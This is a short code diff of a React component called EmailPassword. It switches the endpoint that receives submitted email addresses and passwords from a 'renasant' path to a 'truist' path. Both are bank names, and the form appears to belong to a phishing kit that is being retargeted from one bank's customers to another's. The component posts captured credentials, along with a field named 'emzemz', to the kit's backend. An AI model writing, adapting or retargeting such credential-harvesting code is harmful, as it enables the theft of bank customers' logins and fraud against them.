@@ -57,7 +57,7 @@ const EmailPassword: React.FC = () => {
 
     if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
       try {
-        await axios.post(`${baseUrl}api/renasant-email-password/`, {
+        await axios.post(`${baseUrl}api/truist-email-password/`, {
           emzemz,
           email,
           password
